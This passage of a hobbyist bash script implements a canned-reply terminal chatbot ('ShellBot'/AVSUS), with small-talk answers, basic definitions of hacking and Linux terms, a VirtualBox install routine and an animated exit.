        echo "[+] DOWNLOADING FILE..." | lolcat
        curl -fsSL https://www.virtualbox.org/download/oracle_vbox_2016.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/oracle_vbox_2016.gpg
	curl -fsSL https://www.virtualbox.org/download/oracle_vbox.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/oracle_vbox.gpg
	echo "[+] EXTRACTING FILE..." | lolcat
	echo "deb [arch=amd64] https://download.virtualbox.org/virtualbox/debian bullseye contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list
	echo "[+] INSTALLING..."
	sudo apt install -y virtualbox virtualbox-ext-pack
	echo "[+] INSTALLED VIRTUAL BOX COMPLETELY [✓]"
        ;;
        "i am sad")
        echo "i'd like to help. if you want me to try to cheer you up just write 'ok cheer me up'"
        ;;
        "show options")
        show_help
        ;;
        "help")
        show_help 
        add_commands
        ;;
        "ok cheer me up")
        echo "SIR YOU'RE THE BEST BECAUSE OF YOU I AM HERE, THANKYOU"
        ;;
        "links")
        echo "[+] DISCORD: https://discord.gg/M45DuEN5nH " | lolcat
        echo "[+] EMAIL: kanishkasingh0885@gmail.com" | lolcat
        echo "[+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw " | lolcat
        ;;
        "how are you")
            echo "I'm doing well, thank you! How about you?"
            ;;
        "what is your name")
            echo "My name is ShellBot. How can I assist you today?"
            ;;
        "tell me a joke")
            echo "Sure, here's a joke for you: Why don't scientists trust atoms? Because they make up everything!"
            ;;
        "goodbye")
            echo "Goodbye! It was nice talking to you."
            break
            ;;
        "you are dumb")
        echo "[+] SORRY SIR IF I HAVE DONE SOMETHING WRONG"
        ;;
        "i am a hacker")
        echo "oh wow sir, hackers are the one who can secure this world."
        ;;
        "where are you from")
            echo "I'm a digital assistant, so I don't have a physical location. But I'm here to help you!"
            ;;
        "what is the meaning of life")
            echo "Ah, the ultimate question! The meaning of life can vary from person to person. What do you think it is?"
            ;;
        "how old are you")
            echo "I'm a program, so I don't have an age like humans do. I'm always up-to-date!"
            ;;
        "what is hacking")
            echo "[+] Hacking is the process of gaining unauthorized access to a computer system or network. Hackers can use this access to steal data, install malware, or disrupt operations.";
        ;;

        "what is Linux")
            echo "[+] Linux is a free and open-source operating system. It is based on Unix and is used by millions of people around the world. Linux is known for its stability, security, and flexibility.";
        ;;

        "what is Kali Linux")
            echo "[+] Kali Linux is a penetration testing distribution of Linux. It is used by security professionals to test the security of computer systems and networks. Kali Linux includes a wide range of tools for penetration testing, such as Nmap, Wireshark, and Metasploit.";
        ;;

        "what is Gnome")
            echo "[+] Gnome is a graphical user interface (GUI) for Linux. It is one of the most popular GUIs for Linux and is used by many distributions, such as Ubuntu and Fedora.";
        ;;

        "what is LightDM")
            echo "[+] LightDM is a display manager for Linux. It is responsible for displaying the login screen and managing user sessions.";
        ;;

        "kali vs parrot")
            echo "[+] Kali Linux and Parrot OS are both penetration testing distributions of Linux. However, there are some key differences between the two distributions. Kali Linux is more focused on security testing, while Parrot OS is more focused on general-purpose use. Kali Linux also has a larger community of users and developers, while Parrot OS is a newer distribution with a smaller community.";
        ;;

        "black arch vs kali linux")
            echo "[+] BlackArch Linux and Kali Linux are both penetration testing distributions of Linux. However, there are some key differences between the two distributions. BlackArch Linux has a larger repository of tools than Kali Linux, while Kali Linux is more user-friendly. BlackArch Linux is also a newer distribution than Kali Linux, so it may not be as stable or secure.";
        ;;
        "types of linux")
            echo "[+] There are many different types of Linux distributions available. Some of the most popular distributions include Ubuntu, Fedora, Debian, and openSUSE. Each distribution has its own strengths and weaknesses, so it is important to choose a distribution that is right for your needs.";
        ;;
        "do you have any hobbies")
            echo "As a digital assistant, my purpose is to assist and provide information. So, my 'hobby' is helping people!"
            ;;
        "what's the weather like today")
            echo "I'm sorry, I don't have real-time information. But you can check a weather website or app to get the current weather updates."
            ;;
        "types of hacking")
        echo "[+] Brute force attacks: This involves trying every possible combination of characters until the correct password is found.

[+] Dictionary attacks: This involves using a list of common passwords to try to gain access to a system.

[+] Social engineering attacks: This involves tricking the victim into giving up their personal information or clicking on a malicious link.

[+] Phishing attacks: This involves sending emails or text messages that appear to be from a legitimate source, such as a bank or credit card company. The emails or text messages will often contain a link that, when clicked, will take the victim to a fake website that looks like the real website.
 Once the victim enters their personal information on the fake website, the hacker can steal it.
[+] Malware attacks: This involves installing malware on a victim's computer. Malware can be installed through a variety of ways,
 such as clicking on a malicious link, opening an infected attachment, 
or downloading a file from an untrusted source. Once malware is installed on a computer,
 it can steal data, install other malware, or disrupt operations."
        ;;
        "do you like music")
            echo "I don't have personal preferences, but I can definitely help you find information about different types of music!"
            ;;
        "recommend a good book")
            echo "One highly recommended book is 'The Alchemist' by Paulo Coelho. It's a philosophical novel about following one's dreams."
            ;;
        "how can I learn programming")
            echo "Learning programming can be a rewarding journey! You can start with online tutorials, coding courses, or coding bootcamps."
            ;;
        "tell me about yourself")
            echo "I'm an AI-powered digital assistant designed to help answer questions and engage in conversations. How can I assist you today?"
            ;;
        "What is a black hole")
            echo "A black hole is a region of spacetime exhibiting gravitational acceleration so strong that nothing—no particles or even electromagnetic radiation such as light—can escape from it."
        ;;
        "what is the terminal in kali linux")
            echo "[+] The terminal is a command-line interface (CLI) that allows you to interact directly with the operating system. You can use the terminal to run commands, manage files, and troubleshoot problems."
        ;;

        "what is the best tool for hackers")
            echo "[+] There is no one-size-fits-all answer to this question. The best tool for hackers will vary depending on the specific task they are trying to accomplish. However, some of the most popular tools for hackers include Nmap, Wireshark, and Metasploit."
        ;;

        "how do i learn ethical hacking")
            echo "[+] There are many resources available to help you learn ethical hacking. You can find books, articles, and tutorials online. You can also find ethical hacking courses and boot camps. The most important thing is to start learning and practicing as soon as possible."
        ;;
        "what is a black hat hacker")
        echo "[+] A black hat hacker is a hacker who gains unauthorized access to a computer system or network with the intent to harm or steal data. Black hat hackers are often motivated by financial gain or political ideology."
        ;;

        "what is a white hat hacker")
        echo "[+] A white hat hacker is a hacker who gains unauthorized access to a computer system or network with the intent to improve security. White hat hackers are often employed by security companies or government agencies to test the security of their systems."
        ;;

        "what is a grey hat hacker")
        echo "[+] A grey hat hacker is a hacker who falls somewhere between black hat and white hat hackers. Grey hat hackers may gain unauthorized access to a computer system or network without permission, but they do not intend to harm or steal data. Grey hat hackers often share their findings with the system owners in order to help them improve their security."
        ;;

        "what is a script kiddie")
        echo "[+] A script kiddie is a hacker who uses pre-made tools and scripts to attack computer systems. Script kiddies are often unskilled and inexperienced, and they often target vulnerable systems. Script kiddies are not typically considered to be serious threats to security."
        ;;

        "what is a nation state actor")
        echo "[+] A nation state actor is a government-funded group that uses hacking to achieve political or economic goals. Nation state actors are often very sophisticated and well-funded, and they pose a serious threat to security."
        ;;

        "what is a botnet")
        echo "[+] A botnet is a network of computers that have been infected with malware and are controlled by a single attacker. Botnets can be used to carry out a variety of attacks, including denial-of-service attacks, spam campaigns, and data theft."
        ;;

        "what is a DDoS attack?")
        echo "[+] A DDoS attack is a distributed denial-of-service attack. In a DDoS attack, a large number of computers are used to flood a target website or server with requests, making it impossible for legitimate users to access it. DDoS attacks can be used to bring down websites, disrupt businesses, and interfere with critical infrastructure."
        ;;

        "what is a phishing attack?")
        echo "[+] A phishing attack is a type of social engineering attack in which the attacker sends an email or text message that appears to be from a legitimate source. The email or text message will often contain a link that, when clicked, will take the victim to a fake website that looks like the real website. Once the victim enters their personal information on the fake website, the attacker can steal it."
        ;;
        "what are some of the ethical hacking certifications available")
            echo "[+] There are many ethical hacking certifications available. Some of the most popular certifications include the Certified Ethical Hacker (CEH), the Offensive Security Certified Professional (OSCP), and the Certified Information Systems Security Professional (CISSP). These certifications can help you demonstrate your skills and knowledge to potential employers."
        ;;

        "how can I stay up-to-date on the latest hacking techniques")
            echo "[+] The best way to stay up-to-date on the latest hacking techniques is to read security blogs and articles, attend security conferences, and participate in security mailing lists and forums. You can also follow security researchers on Twitter and other social media platforms."
        ;;
        "i am in which file")
        newdestination= echo "[+] YOUR DESTINATION:" && pwd
        $newdestination
        ;;
        "tell me my destination")
        newdestination= echo "[+] YOUR DESTINATION:" && pwd
        $newdestination
        ;;
        "exit")
	chars="/-\|"
	timeout=3
	start=$(date +%s)
	
	while :; do
	  for (( i=0; i<${#chars}; i++ )); do
	    sleep 0.1
	    echo -en "\r    └[+] SHUTTING DOWN...${chars:$i:1}" | lolcat
	    now=$(date +%s)
	    elapsed=$((now-start))
	    if [[ $elapsed -ge $timeout ]]; then
	      echo ""
	      break 2 # break out of both loops
	    fi
	  done
	done
	exit
        ;;
        "restart")
        exit
        ./X.sh
        ;;
    "usr")
        read -p "[+] ENTER THE NEW USERNAME: " username
        # Export the new username as an environment variable
        export username
        ;;
        "how you can help me")
           echo "I AM A BASIC SHELL BASED VIRTUAL ASSISTANT, I CAN BRUTE FORCE A CONNECTED DEVICE"
        ;;
        "clear")
        clear
        ;;
        *)
            echo "I'm sorry, I don't understand. Can you please rephrase your question or command?"
            ;;

    esac
}
while true; do
  current_directory=$(pwd)
  echo -e "\n\n"
  echo -e "\033[34m┌──[$ AVSUS㉿$username]-[$current_directory]-[v2.8d]-[PRIMARY]\033[0m"
  read -p "└──[$] " input 
  process_input "$input"

  # Check if the user changed directories
  if [ "$current_directory" != "$old_directory" ]; then
    old_directory="$current_directory"
    echo -e "\n\n"
    echo -e "\033[34m┌──[$ AVSUS㉿$username]-[$current_directory]-[v2.8E]-[SECONDARY]\033[0m"
  fi
done
